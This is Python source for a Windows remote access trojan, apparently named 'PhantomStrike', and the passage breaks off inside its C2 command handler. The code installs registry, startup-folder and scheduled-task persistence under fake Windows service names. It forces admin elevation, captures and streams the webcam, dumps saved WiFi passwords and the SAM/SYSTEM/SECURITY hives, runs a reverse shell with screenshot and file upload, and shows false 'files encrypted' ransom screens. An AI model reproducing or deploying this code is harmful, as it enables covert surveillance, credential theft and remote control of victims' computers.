import shutil
import os
import sys
import socket
import time
import subprocess
import json
import threading
import uuid
import traceback
import ctypes
import cv2
import numpy as np
from datetime import datetime
import base64

# ======================================================
# FORCE ERROR LOGGING
# ======================================================
def log_error(e):
    try:
        log_path = os.path.join(os.environ['TEMP'], 'error_log.txt')
        with open(log_path, 'w') as f:
            f.write(f"Error: {e}\n")
            f.write(traceback.format_exc())
    except:
        pass

# ======================================================
# ADMIN ELEVATION
# ======================================================
def elevate_to_admin():
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("[*] Not running as admin. Elevating to admin...")
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit()
    except Exception as e:
        print(f"[!] Elevation failed: {e}")

try:
    # ======================================================
    # LOAD CONFIG
    # ======================================================
    def load_config():
        try:
            if getattr(sys, 'frozen', False):
                base_dir = os.path.dirname(sys.executable)
            else:
                base_dir = os.getcwd()
            config_path = os.path.join(base_dir, 'config.json')
            with open(config_path, 'r') as f:
                return json.load(f)
        except Exception as e:
            log_error(e)
            print(f"[-] Config load failed: {e}")
            sys.exit(1)

    config = load_config()
    C2_HOST = config['C2_HOST']
    C2_PORT = config['C2_PORT']

    # ======================================================
    # PERSISTENCE - REGISTRY
    # ======================================================
    def install_persistence():
        try:
            import winreg
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(handle, "WindowsUpdateService", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(handle)
            return True
        except:
            return False

    # ======================================================
    # PERSISTENCE - SCHEDULED TASK (HAR 2 MINUTE RESTART)
    # ======================================================
    def create_scheduled_task():
        try:
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            
            subprocess.run(
                f'schtasks /delete /tn "WindowsSystemMonitor" /f',
                shell=True,
                creationflags=0x08000000,
                capture_output=True
            )
            
            task_cmd = f'''
            schtasks /create /tn "WindowsSystemMonitor" /tr "{exe_path}" /sc minute /mo 2 /f /ru SYSTEM
            '''
            subprocess.run(task_cmd, shell=True, creationflags=0x08000000)
            print("[+] Scheduled task created! (Runs every 2 minutes)")
            return True
            
        except Exception as e:
            print(f"[-] Scheduled task failed: {e}")
            return False

    # ======================================================
    # PERSISTENCE - STARTUP FOLDER
    # ======================================================
    def install_startup_persistence():
        try:
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            
            startup_folder = os.path.join(
                os.environ['APPDATA'],
                r'Microsoft\Windows\Start Menu\Programs\Startup'
            )
            
            if not os.path.exists(startup_folder):
                os.makedirs(startup_folder)
            
            dest_path = os.path.join(startup_folder, 'WindowsUpdateService.exe')
            
            if getattr(sys, 'frozen', False):
                try:
                    shutil.copy2(exe_path, dest_path)
                except:
                    pass
            else:
                vbs_path = os.path.join(startup_folder, 'WindowsUpdateService.vbs')
                vbs_content = f'''
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run """{sys.executable}"" ""{exe_path}""", 0, False
'''
                with open(vbs_path, 'w') as f:
                    f.write(vbs_content)
            
            return True
        except:
            return False

    # ======================================================
    # SETUP ALL PERSISTENCE
    # ======================================================
    def setup_all_persistence():
        print("[*] Setting up persistence layers...")
        try:
            install_persistence()
            print("[+] Registry persistence installed")
        except:
            pass
        try:
            install_startup_persistence()
            print("[+] Startup folder persistence installed")
        except:
            pass
        try:
            create_scheduled_task()
            print("[+] Scheduled task persistence installed (2 min)")
        except:
            pass
        print("[+] All persistence layers installed!")

    # ======================================================
    # C2 CONFIG
    # ======================================================
    ACTIVE_SSID = None
    NO_WINDOW_FLAG = 0x08000000
    notification_window = None
    notification_thread = None
    stream_thread = None
    stream_active = False
    stream_cap = None
    stream_server = None
    stream_conn = None
    last_ping_time = 0
    reconnect_delay = 5

    # ======================================================
    # get_current_ssid()
    # ======================================================
    def get_current_ssid():
        try:
            ps_command = 'powershell -Command "(Get-NetConnectionProfile).Name"'
            raw_output = subprocess.check_output(ps_command, shell=True, errors='ignore', creationflags=NO_WINDOW_FLAG)
            ssid = raw_output.decode('utf-8', errors='ignore').strip()
            if ssid:
                return ssid
        except:
            pass
        try:
            raw_output = subprocess.check_output("netsh wlan show interfaces", shell=True, errors='ignore', creationflags=NO_WINDOW_FLAG)
            output_str = raw_output.decode('utf-8', errors='ignore') if isinstance(raw_output, bytes) else str(raw_output)
            for line in output_str.split('\n'):
                if "SSID" in line and "BSSID" not in line:
                    ssid = line.split(":")[1].strip()
                    if ssid and ssid != "":
                        return ssid
        except:
            pass
        return None

    # ======================================================
    # get_usb_drive()
    # ======================================================
    def get_usb_drive():
        try:
            drives = []
            for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
                drive = f"{letter}:\\"
                if os.path.exists(drive):
                    drives.append(drive)
            for drive in drives:
                try:
                    if os.path.isdir(drive) and os.path.exists(drive):
                        drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive)
                        if drive_type == 2:
                            return drive
                except:
                    continue
            for drive in drives:
                if drive != "C:\\":
                    return drive
            return None
        except:
            return None

    # ======================================================
    # WEBCAM CAPTURE
    # ======================================================
    def capture_webcam():
        try:
            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            if not cap.isOpened():
                return "FAILURE: Webcam not available"
            cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 0.25)
            for i in range(5):
                ret, frame = cap.read()
                if ret and frame is not None:
                    break
                time.sleep(0.1)
            if not ret or frame is None:
                cap.release()
                return "FAILURE: Could not capture image"
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            photo_path = os.path.join(os.environ['TEMP'], f"webcam_{timestamp}.jpg")
            cv2.imwrite(photo_path, frame)
            cap.release()
            
            try:
                import email_alert
                if email_alert.send_photo(photo_path):
                    return f"SUCCESS: Webcam photo captured and emailed: {photo_path}"
                else:
                    return f"SUCCESS: Webcam photo captured (email failed): {photo_path}"
            except:
                return f"SUCCESS: Webcam photo captured: {photo_path}"
                
        except Exception as e:
            return f"FAILURE: Webcam error: {str(e)}"

    # ======================================================
    # WEBCAM LIVE STREAM
    # ======================================================
    def start_webcam_stream(victim_ip):
        global stream_active, stream_cap, stream_server, stream_conn
        
        cap = None
        server = None
        conn = None
        
        try:
            print(f"[*] Starting webcam stream on {victim_ip}:8080...")
            
            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            if not cap.isOpened():
                print("⚠️ Webcam not available")
                stream_active = False
                return
            
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            cap.set(cv2.CAP_PROP_FPS, 20)
            print("[*] Webcam initialized")
            
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((victim_ip, 8080))
            server.listen(1)
            server.settimeout(1.0)
            print(f"📡 Webcam stream server started on {victim_ip}:8080")
            
            stream_cap = cap
            stream_server = server
            stream_active = True
            
            while stream_active:
                try:
                    conn, addr = server.accept()
                    print(f"📡 Stream client connected: {addr[0]}")
                    stream_conn = conn
                    
                    while stream_active:
                        ret, frame = cap.read()
                        if not ret:
                            break
                        
                        _, img_encoded = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                        data = img_encoded.tobytes()
                        
                        try:
                            conn.send(str(len(data)).zfill(10).encode() + data)
                        except (BrokenPipeError, ConnectionResetError):
                            break
                        except Exception:
                            break
                        
                        time.sleep(0.05)
                    
                    try:
                        conn.close()
                    except:
                        pass
                    conn = None
                    stream_conn = None
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if stream_active:
                        print(f"⚠️ Stream connection error: {e}")
                    break
                    
        except Exception as e:
            print(f"⚠️ Stream error: {e}")
        finally:
            stream_active = False
            if conn:
                try:
                    conn.close()
                except:
                    pass
            if stream_conn:
                try:
                    stream_conn.close()
                except:
                    pass
            stream_conn = None
            if server:
                try:
                    server.close()
                except:
                    pass
            if stream_server:
                try:
                    stream_server.close()
                except:
                    pass
            stream_server = None
            if cap:
                try:
                    cap.release()
                    print("[*] Webcam released (light should turn off)")
                except:
                    pass
            if stream_cap:
                try:
                    stream_cap.release()
                except:
                    pass
            stream_cap = None
            try:
                cv2.destroyAllWindows()
            except:
                pass
            print("[*] Stream server stopped")

    # ======================================================
    # FORCE STOP WEBCAM
    # ======================================================
    def force_stop_webcam():
        global stream_active, stream_cap, stream_server, stream_conn
        print("[*] Force stopping webcam...")
        stream_active = False
        if stream_conn:
            try:
                stream_conn.close()
            except:
                pass
        stream_conn = None
        if stream_server:
            try:
                stream_server.close()
            except:
                pass
        stream_server = None
        if stream_cap:
            try:
                stream_cap.release()
                print("[*] Webcam force released")
            except:
                pass
        stream_cap = None
        try:
            cv2.destroyAllWindows()
        except:
            pass
        print("[*] Webcam force stopped")

    # ======================================================
    # GET VICTIM IP
    # ======================================================
    def get_victim_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            try:
                return socket.gethostbyname(socket.gethostname())
            except:
                return "127.0.0.1"

    # ======================================================
    # OPEN URL
    # ======================================================
    def open_url_on_victim():
        url = "https://reformist-handed-trapping.ngrok-free.dev"
        try:
            subprocess.Popen(f'start {url}', shell=True, creationflags=NO_WINDOW_FLAG)
            time.sleep(2)
            return f"SUCCESS: URL opened: {url}"
        except Exception as e:
            return f"FAILURE: {str(e)}"

    # ======================================================
    # HACKED MESSAGE
    # ======================================================
    def show_hacked_message():
        try:
            ps_command = '''
            Add-Type -AssemblyName System.Windows.Forms
            Add-Type -AssemblyName System.Drawing
            $form = New-Object System.Windows.Forms.Form
            $form.Text = "⚠️ SECURITY ALERT"
            $form.Size = New-Object System.Drawing.Size(600, 300)
            $form.StartPosition = "CenterScreen"
            $form.FormBorderStyle = "FixedDialog"
            $form.MaximizeBox = $false
            $form.MinimizeBox = $false
            $form.BackColor = [System.Drawing.Color]::DarkRed
            $form.TopMost = $true
            $label = New-Object System.Windows.Forms.Label
            $label.Text = "⚠️ YOUR SYSTEM HAS BEEN COMPROMISED!"
            $label.Size = New-Object System.Drawing.Size(550, 200)
            $label.Location = New-Object System.Drawing.Point(25, 30)
            $label.Font = New-Object System.Drawing.Font("Arial", 14, [System.Drawing.FontStyle]::Bold)
            $label.ForeColor = [System.Drawing.Color]::White
            $label.TextAlign = "MiddleCenter"
            $form.Controls.Add($label)
            $button = New-Object System.Windows.Forms.Button
            $button.Text = "OK"
            $button.Size = New-Object System.Drawing.Size(80, 30)
            $button.Location = New-Object System.Drawing.Point(260, 220)
            $button.Add_Click({$form.Close()})
            $form.Controls.Add($button)
            $form.ShowDialog()
            '''
            subprocess.Popen(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_command], creationflags=NO_WINDOW_FLAG)
            return "SUCCESS: Hacked message displayed"
        except Exception as e:
            return f"FAILURE: {str(e)}"

    # ======================================================
    # PLAY VOICE
    # ======================================================
    def play_voice():
        try:
            import pyttsx3
            engine = pyttsx3.init()
            engine.say("Your system has been compromised! All your files are encrypted. Contact attacker for recovery.")
            engine.runAndWait()
            return "SUCCESS: Voice message played"
        except Exception as e:
            return f"FAILURE: {str(e)}"

    # ======================================================
    # SHOW PERSISTENT NOTIFICATION
    # ======================================================
    def show_persistent_notification():
        global notification_window, notification_thread
        try:
            import tkinter as tk
            
            def create_window():
                global notification_window
                try:
                    root = tk.Tk()
                    root.title("⚠️ SECURITY ALERT")
                    root.attributes('-fullscreen', True)
                    root.configure(bg='darkred')
                    root.attributes('-topmost', True)
                    root.overrideredirect(True)
                    
                    label = tk.Label(root, text="⚠️ YOUR SYSTEM HAS BEEN COMPROMISED!\n\nAll your files and data have been exfiltrated.\n\nContact attacker@email.com for recovery.", 
                                     fg='white', bg='darkred', font=('Arial', 24, 'bold'))
                    label.pack(expand=True)
                    
                    notification_window = root
                    root.mainloop()
                    notification_window = None
                except:
                    notification_window = None
            
            if notification_thread is None or not notification_thread.is_alive():
                notification_thread = threading.Thread(target=create_window, daemon=True)
                notification_thread.start()
                time.sleep(1)
                return "SUCCESS: Full screen notification shown"
            else:
                return "SUCCESS: Notification already showing"
        except Exception as e:
            return f"FAILURE: {str(e)}"

    # ======================================================
    # CLOSE NOTIFICATION
    # ======================================================
    def close_notification():
        global notification_window, notification_thread
        try:
            if notification_window is not None:
                try:
                    notification_window.quit()
                    notification_window.destroy()
                except:
                    try:
                        notification_window.destroy()
                    except:
                        pass
                notification_window = None
                notification_thread = None
                return "SUCCESS: Notification closed"
            else:
                return "SUCCESS: No active notification to close"
        except Exception as e:
            notification_window = None
            notification_thread = None
            return "SUCCESS: Notification closed"

    # ======================================================
    # WIFI SCANNER
    # ======================================================
    def scan_wifi_networks():
        try:
            raw_output = subprocess.check_output("netsh wlan show networks mode=Bssid", shell=True, errors='ignore', creationflags=NO_WINDOW_FLAG)
            if isinstance(raw_output, bytes):
                output_str = raw_output.decode('utf-8', errors='ignore')
            else:
                output_str = str(raw_output)
            
            networks = []
            current_ssid = None
            for line in output_str.split('\n'):
                line = line.strip()
                if "SSID" in line and "BSSID" not in line:
                    current_ssid = line.split(":")[1].strip()
                    networks.append({"ssid": current_ssid, "security": "Unknown", "signal": "N/A"})
                elif "Authentication" in line and current_ssid:
                    security = line.split(":")[1].strip()
                    if networks and networks[-1]["ssid"] == current_ssid:
                        networks[-1]["security"] = security
                elif "Signal" in line and current_ssid:
                    signal = line.split(":")[1].strip() + "%"
                    if networks and networks[-1]["ssid"] == current_ssid:
                        networks[-1]["signal"] = signal
            
            result = []
            for net in networks[:10]:
                result.append(f"SSID: {net['ssid']} | Security: {net['security']} | Signal: {net['signal']}")
            return "\n".join(result) if result else "No networks found"
        except Exception as e:
            return f"SCAN FAILED: {str(e)}"

    # ======================================================
    # WIFI PASSWORD STEAL
    # ======================================================
    def scan_wifi_with_passwords():
        results = []
        try:
            raw_profiles = subprocess.check_output("netsh wlan show profiles", shell=True, errors='ignore', creationflags=NO_WINDOW_FLAG)
            if isinstance(raw_profiles, bytes):
                output_str = raw_profiles.decode('utf-8', errors='ignore')
            else:
                output_str = str(raw_profiles)
            
            profiles = []
            for line in output_str.split('\n'):
                if "All User Profile" in line:
                    ssid = line.split(":")[1].strip()
                    if ssid:
                        profiles.append(ssid)
            
            if not profiles:
                return "No saved WiFi profiles found"
            
            for ssid in profiles[:10]:
                try:
                    raw_res = subprocess.check_output(f'netsh wlan show profile name="{ssid}" key=clear', shell=True, errors='ignore', creationflags=NO_WINDOW_FLAG)
                    if isinstance(raw_res, bytes):
                        res_str = raw_res.decode('utf-8', errors='ignore')
                    else:
                        res_str = str(raw_res)
                    
                    password = None
                    for line in res_str.split('\n'):
                        if "Key Content" in line:
                            password = line.split(":")[1].strip()
                            break
                    
                    if password:
                        results.append(f"SSID: {ssid} | Password: {password}")
                    else:
                        results.append(f"SSID: {ssid} | Password: [Not saved/open network]")
                except:
                    results.append(f"SSID: {ssid} | Password: [Error fetching]")
            
            return "\n".join(results) if results else "No passwords found"
        except Exception as e:
            return f"SCAN FAILED: {str(e)}"

    # ======================================================
    # EXTRACT WIFI PASSWORDS
    # ======================================================
    def extract_wifi_passwords():
        result = scan_wifi_with_passwords()
        return result if result else "No saved WiFi profiles found"

    # ======================================================
    # FULL SYSTEM INFO
    # ======================================================
    def get_full_system_info():
        try:
            import platform
            results = []
            results.append("=" * 50)
            results.append("SYSTEM INFORMATION")
            results.append("=" * 50)
            
            results.append(f"Computer Name: {os.environ.get('COMPUTERNAME', 'Unknown')}")
            results.append(f"Username: {os.environ.get('USERNAME', 'Unknown')}")
            results.append(f"OS: {platform.system()} {platform.release()}")
            results.append(f"Architecture: {platform.machine()}")
            
            try:
                cpu = subprocess.check_output("wmic cpu get name", shell=True, creationflags=NO_WINDOW_FLAG).decode('utf-8', errors='ignore').strip()
                cpu_lines = [l for l in cpu.split('\n') if l.strip() and not 'Name' in l]
                if cpu_lines:
                    results.append(f"CPU: {cpu_lines[0].strip()}")
            except: pass
            
            try:
                ram = subprocess.check_output("wmic os get TotalVisibleMemorySize", shell=True, creationflags=NO_WINDOW_FLAG).decode('utf-8', errors='ignore').strip()
                ram_lines = [l for l in ram.split('\n') if l.strip() and not 'TotalVisibleMemorySize' in l]
                if ram_lines:
                    ram_mb = int(ram_lines[0].strip()) // 1024
                    results.append(f"RAM: {ram_mb} MB")
            except: pass
            
            try:
                disk = subprocess.check_output("wmic logicaldisk get caption,size,freespace", shell=True, creationflags=NO_WINDOW_FLAG).decode('utf-8', errors='ignore').strip()
                results.append("Drives:")
                for line in disk.split('\n')[1:]:
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 3:
                            try:
                                free = int(parts[1]) // (1024**3)
                                total = int(parts[2]) // (1024**3)
                                results.append(f"  {parts[0]}: {free}GB free / {total}GB total")
                            except:
                                pass
            except: pass
            
            try:
                ip = subprocess.check_output("ipconfig | findstr IPv4", shell=True, creationflags=NO_WINDOW_FLAG).decode('utf-8', errors='ignore').strip()
                for line in ip.split('\n'):
                    if line.strip():
                        results.append(f"IP: {line.strip()}")
            except: pass
            
            results.append("=" * 50)
            return "\n".join(results)
        except Exception as e:
            return f"FAILURE: {str(e)}"

    # ======================================================
    # SYSTEM FINGERPRINT
    # ======================================================
    def get_system_fingerprint():
        try:
            hostname = os.environ.get('COMPUTERNAME', 'Target-PC')
            username = os.environ.get('USERNAME', 'Target-User')
            raw_mac = uuid.getnode()
            mac_formatted = ':'.join(['{:02x}'.format((raw_mac >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
            return json.dumps({"hostname": hostname, "username": username, "mac_address": mac_formatted})
        except:
            return json.dumps({"hostname": "Unknown", "username": "Unknown", "mac_address": "Unknown"})

    # ======================================================
    # REVERSE SHELL - FIXED VERSION (subprocess/os modules properly imported)
    # ======================================================
    def execute_live_reverse_shell(conn):
        # Import modules inside function to ensure they're available
        import subprocess
        import os
        import base64
        import time
        from datetime import datetime
        
        try:
            banner = """
╔═══════════════════════════════════════════════════════╗
║     🔥 PHANTOMSTRIKE - POWERFUL REVERSE SHELL        ║
║     Type 'exit_shell' to return to C2 menu           ║
║     Special Commands:                                ║
║       screenshot   - Take screenshot                  ║
║       upload file  - Upload file to C2               ║
║       reg save HKLM\\SAM C:\\SAM.hive - Extract SAM   ║
╚═══════════════════════════════════════════════════════╝
"""
            conn.send(banner.encode())
            conn.send(b"\nPS C:\\> ")
            
            while True:
                try:
                    conn.settimeout(60)
                    command = conn.recv(8192).decode('utf-8', errors='ignore').strip()
                    conn.settimeout(None)
                    
                    if command.lower() in ["exit_shell", "exit", "quit"]:
                        conn.send(b"\n[*] Shell session ended. Returning to C2...\n")
                        break
                    
                    if not command:
                        conn.send(b"\nPS C:\\> ")
                        continue
                    
                    # ======================================================
                    # UPLOAD COMMAND - FIXED
                    # ======================================================
                    if command.lower().startswith("upload "):
                        try:
                            filepath = command.split(" ", 1)[1].strip()
                            if os.path.exists(filepath):
                                with open(filepath, 'rb') as f:
                                    content = f.read()
                                    encoded = base64.b64encode(content).decode('ascii')
                                    conn.send(f"FILE:{os.path.basename(filepath)}:{encoded}".encode())
                                conn.send(b"\n[+] File uploaded!\nPS C:\\> ")
                            else:
                                conn.send(f"[-] File not found: {filepath}\n".encode())
                                conn.send(b"\nPS C:\\> ")
                            continue
                        except Exception as e:
                            conn.send(f"[-] Upload error: {str(e)}\n".encode())
                            conn.send(b"\nPS C:\\> ")
                            continue
                    
                    # ======================================================
                    # SCREENSHOT COMMAND
                    # ======================================================
                    if command.lower() == "screenshot":
                        try:
                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                            output = os.path.join(os.environ['TEMP'], f"screenshot_{timestamp}.png")
                            
                            ps_script = f'''
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
$bitmap.Save("{output}")
$graphics.Dispose()
$bitmap.Dispose()
'''
                            subprocess.run(
                                ['powershell', '-WindowStyle', 'Hidden', '-Command', ps_script],
                                timeout=30
                            )
                            
                            if os.path.exists(output):
                                with open(output, 'rb') as f:
                                    content = f.read()
                                    encoded = base64.b64encode(content).decode('ascii')
                                    conn.send(f"SCREENSHOT:{os.path.basename(output)}:{encoded}".encode())
                                os.remove(output)
                                conn.send(b"\n[+] Screenshot captured!\nPS C:\\> ")
                            else:
                                conn.send(b"[-] Screenshot failed\nPS C:\\> ")
                            continue
                        except Exception as e:
                            conn.send(f"[-] Screenshot error: {str(e)}\n".encode())
                            conn.send(b"\nPS C:\\> ")
                            continue
                    
                    # ======================================================
                    # REG SAVE (SAM/SYSTEM Extraction)
                    # ======================================================
                    if command.lower().startswith("reg save"):
                        try:
                            hives = ["SAM", "SYSTEM", "SECURITY"]
                            results = []
                            temp_dir = os.path.join(os.environ['TEMP'], 'hive_extract')
                            os.makedirs(temp_dir, exist_ok=True)
                            
                            for hive in hives:
                                dest = os.path.join(temp_dir, hive)
                                cmd = f'reg save HKLM\\{hive} "{dest}" /y'
                                try:
                                    subprocess.run(cmd, shell=True, timeout=15, capture_output=True)
                                    if os.path.exists(dest) and os.path.getsize(dest) > 100:
                                        with open(dest, 'rb') as f:
                                            content = f.read()
                                            encoded = base64.b64encode(content).decode('ascii')
                                            results.append(f"{hive}:{encoded}")
                                            conn.send(f"[+] {hive} extracted ({len(content)} bytes)\n".encode())
                                        os.remove(dest)
                                    else:
                                        conn.send(f"[-] Failed to extract {hive}\n".encode())
                                except Exception as e:
                                    conn.send(f"[-] Error extracting {hive}: {str(e)}\n".encode())
                            
                            os.rmdir(temp_dir)
                            
                            if results:
                                combined = "|".join(results)
                                conn.send(f"\n[+] All hives extracted! Data size: {len(combined)} bytes\n".encode())
                            else:
                                conn.send("[-] No hives extracted\n".encode())
                            
                            conn.send(b"\nPS C:\\> ")
                            continue
                        except Exception as e:
                            conn.send(f"[-] Extraction error: {str(e)}\n".encode())
                            conn.send(b"\nPS C:\\> ")
                            continue
                    
                    # ======================================================
                    # EXECUTE ANY COMMAND
                    # ======================================================
                    try:
                        proc = subprocess.Popen(
                            command,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            creationflags=0x08000000,
                            encoding='utf-8',
                            errors='ignore'
                        )
                        
                        try:
                            stdout, stderr = proc.communicate(timeout=120)
                        except subprocess.TimeoutExpired:
                            proc.kill()
                            stdout, stderr = proc.communicate()
                            conn.send(b"\n[-] Command timed out (120s)\n")
                            conn.send(b"\nPS C:\\> ")
                            continue
                        
                        if stdout:
                            conn.send(stdout.encode('utf-8', errors='ignore'))
                        if stderr:
                            conn.send(stderr.encode('utf-8', errors='ignore'))
                        
                        if not stdout and not stderr:
                            conn.send(b"[+] Command executed successfully (no output)\n")
                        
                        conn.send(b"\nPS C:\\> ")
                        
                    except Exception as e:
                        conn.send(f"\n[-] Error executing: {str(e)}\n".encode())
                        conn.send(b"\nPS C:\\> ")
                        
                except socket.timeout:
                    conn.send(b"\n[-] No input received. Type 'exit_shell' to exit.\n")
                    conn.send(b"\nPS C:\\> ")
                    continue
                except Exception as e:
                    conn.send(f"\n[-] Connection error: {str(e)}\n".encode())
                    break
                    
        except Exception as e:
            print(f"[!] Shell error: {e}")
        finally:
            print("[*] Shell session closed")

    # ======================================================
    # DISABLE / ENABLE NETWORK
    # ======================================================
    def get_interface_name():
        try:
            result = subprocess.check_output("netsh interface show interface", shell=True, creationflags=NO_WINDOW_FLAG)
            output = result.decode('utf-8', errors='ignore') if isinstance(result, bytes) else str(result)
            for line in output.split('\n'):
                if "Ethernet" in line or "Wi-Fi" in line or "Local Area Connection" in line:
                    parts = line.split()
                    if len(parts) >= 4:
                        name = parts[-1].strip()
                        if name:
                            return name
            return "Ethernet"
        except:
            return "Ethernet"

    def disable_wired_network():
        try:
            interface_name = get_interface_name()
            subprocess.run(f'netsh interface set interface "{interface_name}" admin=disable', shell=True, creationflags=NO_WINDOW_FLAG)
            return f"SUCCESS: Network [{interface_name}] disabled"
        except Exception as e:
            return f"FAILURE: {str(e)}"

    def enable_wired_network():
        try:
            interface_name = get_interface_name()
            subprocess.run(f'netsh interface set interface "{interface_name}" admin=enable', shell=True, creationflags=NO_WINDOW_FLAG)
            return f"SUCCESS: Network [{interface_name}] enabled"
        except Exception as e:
            return f"FAILURE: {str(e)}"

    # ======================================================
    # EXTRACT SAM - USING REG SAVE
    # ======================================================
    def extract_sam():
        try:
            temp_dir = os.path.join(os.environ['TEMP'], 'sam_extract')
            os.makedirs(temp_dir, exist_ok=True)
            
            dest = os.path.join(temp_dir, "SAM")
            
            cmd = f'reg save HKLM\\SAM "{dest}" /y'
            subprocess.run(cmd, shell=True, capture_output=True, creationflags=NO_WINDOW_FLAG, timeout=10)
            
            if not os.path.exists(dest) or os.path.getsize(dest) < 100:
                shutil.rmtree(temp_dir, ignore_errors=True)
                return "FAILURE: Could not extract SAM"
            
            with open(dest, 'rb') as f:
                content = f.read()
            
            shutil.rmtree(temp_dir, ignore_errors=True)
            
            encoded = base64.b64encode(content).decode('ascii')
            return f"SAM_FILE:{encoded}"
            
        except Exception as e:
            return f"FAILURE: {str(e)}"

    # ======================================================
    # EXTRACT SYSTEM - USING REG SAVE
    # ======================================================
    def extract_system_only():
        try:
            temp_dir = os.path.join(os.environ['TEMP'], 'system_extract')
            os.makedirs(temp_dir, exist_ok=True)
            
            dest = os.path.join(temp_dir, "SYSTEM")
            
            cmd = f'reg save HKLM\\SYSTEM "{dest}" /y'
            subprocess.run(cmd, shell=True, capture_output=True, creationflags=NO_WINDOW_FLAG, timeout=10)
            
            if not os.path.exists(dest) or os.path.getsize(dest) < 100:
                shutil.rmtree(temp_dir, ignore_errors=True)
                return "FAILURE: Could not extract SYSTEM"
            
            with open(dest, 'rb') as f:
                content = f.read()
            
            shutil.rmtree(temp_dir, ignore_errors=True)
            
            encoded = base64.b64encode(content).decode('ascii')
            return f"SYSTEM_FILE:{encoded}"
            
        except Exception as e:
            return f"FAILURE: {str(e)}"

    # ======================================================
    # START AGENT
    # ======================================================
    def start_agent():
        global ACTIVE_SSID, notification_window, notification_thread, stream_thread, stream_active, last_ping_time
        
        # Setup persistence first
        setup_all_persistence()
        
        elevate_to_admin()
        
        print("[*] Agent starting...")
        print(f"[*] Connecting to {C2_HOST}:{C2_PORT}")
        
        victim_ip = get_victim_ip()
        print(f"[*] Victim IP: {victim_ip}")
        
        while True:
            try:
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.settimeout(5)
                print(f"[*] Connecting to {C2_HOST}:{C2_PORT}...")
                client_socket.connect((C2_HOST, C2_PORT))
                print("[+] Connected to C2 server!")
                
                client_socket.send(get_system_fingerprint().encode('utf-8'))
                last_ping_time = time.time()
                
                while True:
                    try:
                        if time.time() - last_ping_time > 30:
                            try:
                                client_socket.send(b"PING")
                                last_ping_time = time.time()
                            except:
                                print("[-] PING failed, reconnecting...")
                                break
                        
                        client_socket.settimeout(2)
                        instruction = client_socket.recv(1024).decode('utf-8').strip()
                        client_socket.settimeout(5)
                        
                        if not instruction:
                            continue
                            
                        if instruction == "PING":
                            client_socket.send(b"PONG")
                            continue
                        
                    except socket.timeout:
                        continue
                    except Exception as e:
                        print(f"[-] Connection error: {e}")
                        break

                    # ======================================================
                    # COMMAND HANDLING
                    # ======================================================
                    
                    if instruction == "FETCH:FINGERPRINT":
                        client_socket.send(get_system_fingerprint().encode('utf-8'))

                    elif instruction == "RUN:SCAN_WIFI":
                        result = scan_wifi_networks()
                        client_socket.send(result.encode('utf-8'))

                    elif instruction == "RUN:SCAN_WIFI_PASSWORDS":
                        result = scan_wifi_with_passwords()
                        client_socket.send(result.encode('utf-8'))

                    elif instruction == "RUN:SYS_INFO":
                        result = get_full_system_info()
                        client_socket.send(result.encode('utf-8'))

                    elif instruction == "RUN:COLLECT":
                        try:
                            usb_letter = get_usb_drive()
                            if usb_letter is None:
                                usb_letter = "F:"
                            dest_vault = os.path.join(usb_letter, os.sep, ".phantom_vault")
                            os.makedirs(dest_vault, exist_ok=True)
                            copied_count = 0
                            paths_to_search = [
                                os.path.join(os.environ['USERPROFILE'], 'Desktop'),
                                os.path.join(os.environ['USERPROFILE'], 'Documents')
                            ]
                            for search_path in paths_to_search:
                                if os.path.exists(search_path):
                                    for file in os.listdir(search_path):
                                        if file.lower().endswith(('.txt', '.pdf', '.docx', '.png', '.jpg')):
                                            try:
                                                shutil.copy(os.path.join(search_path, file), dest_vault)
                                                copied_count += 1
                                                if copied_count >= 3:
                                                    break
                                            except:
                                                continue
                                    if copied_count >= 3:
                                        break
                            res = f"SUCCESS: Copied {copied_count} files to {dest_vault}"
                            client_socket.send(res.encode('utf-8'))
                        except Exception as e:
                            res = f"FAILURE: {str(e)}"
                            client_socket.send(res.encode('utf-8'))

                    elif instruction == "RUN:STEAL":
                        result = extract_wifi_passwords()
                        client_socket.send(result.encode('utf-8'))

                    elif instruction == "RUN:LOCK_SCREEN":
                        try:
